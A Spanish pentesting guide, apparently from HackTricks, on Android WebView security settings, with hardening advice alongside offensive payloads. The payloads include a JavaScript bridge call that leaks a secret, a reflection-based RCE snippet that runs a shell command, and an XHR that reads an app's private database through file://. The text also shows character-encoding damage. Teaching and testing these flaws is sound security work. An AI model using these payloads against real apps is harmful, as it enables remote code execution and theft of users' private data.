# Configuraciones interesantes

## Acceso a archivos

El acceso a archivos de _WebView_ est√° habilitado por defecto. Desde la API 3 (Cupcake 1.5) est√° disponible el m√©todo [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) para habilitarlo o deshabilitarlo expl√≠citamente.\
Si la aplicaci√≥n tiene _**android.permission.READ\_EXTERNAL\_STORAGE**_ podr√° leer y cargar archivos **desde el almacenamiento externo**.\
El _WebView_ necesita usar un esquema de URL de archivo, por ejemplo, `file://path/file`, para acceder al archivo.

### Acceso universal desde URL de archivo (obsoleto)

> Establece si las solicitudes **cross-origin** en el **contexto de una URL de esquema de archivo** deben permitir el acceso a **contenido desde cualquier origen**. Esto incluye **acceso a contenido desde otras URL de esquema de archivo o contextos web.** Tenga en cuenta que algunos accesos, como los elementos HTML de imagen, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilite esta configuraci√≥n si abre archivos que pueden ser creados o alterados por fuentes externas. Habilitar esta configuraci√≥n permite que los scripts maliciosos cargados en un contexto `file://` lancen ataques de scripting entre sitios, accediendo a **archivos locales arbitrarios**, incluidas las cookies de WebView, los datos privados de la aplicaci√≥n o incluso las credenciales utilizadas en sitios web arbitrarios.

En resumen, esto **evitar√° la carga de or√≠genes arbitrarios**. La aplicaci√≥n enviar√° la solicitud de URL para cargar el contenido con **`Origin: file://`** si la respuesta no permite ese origen (**`Access-Control-Allow-Origin: file://`**), entonces el contenido no se cargar√°.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y superior.

* Use [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) para saber si JavaScript que se ejecuta en el contexto de una URL de esquema de archivo puede acceder a contenido desde cualquier origen (si se habilita UniversalAccessFromFileURL).
* Use [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) para habilitarlo o deshabilitarlo.

{% hint style="info" %}
Usar **`loadDataWithBaseURL()`** con `null` como baseURL tambi√©n **evitar√° la carga de archivos locales** incluso si todas las configuraciones peligrosas est√°n habilitadas.
{% endhint %}

### Acceso a archivos desde URL de archivo (obsoleto) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Establece si las solicitudes **cross-origin** en el **contexto de una URL de esquema de archivo** deben permitir el acceso a contenido desde otras URL de esquema de archivo. Tenga en cuenta que algunos accesos, como los elementos HTML de imagen, no siguen las reglas de mismo origen y no se ven afectados por esta configuraci√≥n.
>
> **No** habilite esta configuraci√≥n si abre archivos que pueden ser creados o alterados por fuentes externas. Habilitar esta configuraci√≥n permite que los scripts maliciosos cargados en un contexto `file://` accedan a archivos locales arbitrarios, incluidas las cookies de WebView y los datos privados de la aplicaci√≥n.

En resumen, esto evita que JavaScript acceda a archivos locales a trav√©s del protocolo `file://`.\
Tenga en cuenta que **el valor de esta configuraci√≥n se ignora** si el valor de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) es `true`. \
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) y superior.

* Use [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) para saber si JavaScript se est√° ejecutando en el contexto de una URL de esquema de archivo y puede acceder a contenido desde otras URL de esquema de archivo.
* Use [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) para habilitarlo o deshabilitarlo.

### Acceso a archivos

> Habilita o deshabilita el **acceso a archivos dentro de WebView**. Tenga en cuenta que esto habilita o deshabilita el acceso al sistema de archivos solamente. Los activos y recursos siguen siendo accesibles mediante file:///android_asset y file:///android_res.

En resumen, si se deshabilita, el WebView no podr√° cargar un archivo local con el protocolo `file://`.\
El **valor predeterminado es `false`** al apuntar a [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) y superior.

* Use [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) para saber si la configuraci√≥n est√° habilitada.
* Use [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) para habilitarlo o deshabilitarlo.

### WebViewAssetLoader

> Clase auxiliar para cargar archivos locales, incluidos los activos est√°ticos y los recursos de la aplicaci√≥n, utilizando URL http(s):// dentro de una clase [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Cargar archivos locales utilizando URL similares a las web en lugar de `"file://"` es deseable ya que es compatible con la pol√≠tica de mismo origen.

Esta es la nueva forma recomendada de cargar archivos locales. El objetivo es **acceder a archivos locales utilizando una URL HTTP con el dominio**. De esta manera, la **CORS** se puede **mantener f√°cilmente** entre las **p√°ginas web** locales y las **p√°ginas web** que se descargan del servidor web.

## Javascript habilitado

Los WebViews tienen Javascript **deshabilitado por defecto**. El m√©todo [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) puede habilitarlo o deshabilitarlo expl√≠citamente. \
Tenga en cuenta que los webviews tambi√©n pueden admitir el **esquema de intenci√≥n** que permite lanzar otras aplicaciones. Lea este [art√≠culo para saber c√≥mo pasar de XSS a RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

## Puente de Javascript

Android ofrece una forma para que el JavaScript ejecutado en un WebView llame y use **funciones nativas de una aplicaci√≥n de Android** (anotadas con `@JavascriptInterface`) mediante el uso del m√©todo [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Esto se conoce como un _WebView JavaScript bridge_ o _native bridge_.

Tenga en cuenta que **cuando usa `addJavascriptInterface`, est√° otorgando expl√≠citamente acceso al objeto de interfaz de JavaScript registrado a todas las p√°ginas cargadas dentro de ese WebView**. Esto implica que, si el usuario navega fuera de su aplicaci√≥n o dominio, todas las dem√°s p√°ginas externas tambi√©n tendr√°n acceso a esos objetos de interfaz de JavaScript, lo que podr√≠a presentar un riesgo potencial de seguridad si se expone alg√∫n dato sensible a trav√©s de esas interfaces.

> Advertencia: Tenga mucho cuidado con las aplicaciones que apuntan a versiones de Android anteriores
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
    // Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
    // not annotated with @JavascriptInterface are not visible from JavaScript
    @JavascriptInterface
    public String getSecret() {
        return "SuperSecretPassword";
    };
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Con acceso al c√≥digo JavaScript, a trav√©s de, por ejemplo, una **XSS** almacenada, un ataque **MITM** o un **sitio web malicioso** que se carga dentro del WebView, se puede llamar directamente a los m√©todos Java expuestos.

{% hint style="info" %}
Tenga en cuenta que en el caso de intentar explotar esta vulnerabilidad a trav√©s de una **Redirecci√≥n Abierta a una p√°gina web del atacante que accede al Objeto Nativo de Android**. Si el acceso a la redirecci√≥n se realiza a trav√©s de un **navegador m√≥vil** y **no se utiliza** el mismo **WebView**, el **navegador no podr√° acceder al objeto nativo de Android**.
{% endhint %}

Si es necesario utilizar `addJavascriptInterface`, tenga en cuenta las siguientes consideraciones:

* **Solo se debe permitir que el JavaScript proporcionado** con el APK use los puentes, por ejemplo, verificando la URL en cada m√©todo Java conectado (a trav√©s de `WebView.getUrl`).
* **No se debe cargar JavaScript desde puntos finales remotos**, por ejemplo, manteniendo la navegaci√≥n de la p√°gina dentro de los dominios de la aplicaci√≥n y abriendo todos los dem√°s dominios en el navegador predeterminado (por ejemplo, Chrome, Firefox).
* Si es necesario por razones de compatibilidad (por ejemplo, tener que admitir dispositivos m√°s antiguos), **al menos establezca el nivel de API m√≠nimo en 17** en el archivo de manifiesto de la aplicaci√≥n (`<uses-sdk android:minSdkVersion="17" />`).

## Puente de JavaScript a RCE a trav√©s de Reflection

Como se se√±ala en [**esta investigaci√≥n**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_rev√≠sela para obtener ideas en caso de obtener RCE_), una vez que se encuentra un JavascriptBridge, es posible obtener **RCE** a trav√©s de **Reflection** utilizando una carga √∫til como la siguiente:
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
  return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Sin embargo, las aplicaciones modernas pueden usar la **anotaci√≥n `@JavascriptInterface`** que indica al JavascriptBridge que solo el m√©todo con esta anotaci√≥n debe ser **expuesto**.\
En ese escenario, no podr√°s abusar de Reflection para ejecutar c√≥digo arbitrario.

## Depuraci√≥n remota

La **depuraci√≥n remota** de WebView permite acceder al WebView con las **Herramientas de desarrollo de Chrome**.\
El **dispositivo** debe ser **accesible** por la PC (a trav√©s de USB, emulador local, red local...) y ejecutar el WebView depurable, luego acceder a **chrome://inspect/#devices**:

![](<../../.gitbook/assets/image (525).png>)

Selecciona **inspeccionar** y se abrir√° una nueva ventana. En esta ventana puedes **interactuar con el contenido** del **WebView** e incluso hacer que ejecute c√≥digo JS arbitrario desde la pesta√±a de **consola**:

![](<../../.gitbook/assets/image (526).png>)

Para habilitar la **depuraci√≥n remota de WebView** puedes hacer algo como:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```
**Esta configuraci√≥n se aplica a todos los WebViews de la aplicaci√≥n.**

{% hint style="info" %}
**La depuraci√≥n de WebView no se ve afectada por el estado de la bandera `debuggable`** en el manifiesto de la aplicaci√≥n. Si desea habilitar la depuraci√≥n de WebView solo cuando `debuggable` es `true`, pruebe la bandera en tiempo de ejecuci√≥n.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
    { WebView.setWebContentsDebuggingEnabled(true); }
}
```
# Cargas √∫tiles

## Exfiltrar archivos arbitrarios
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# Referencias

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
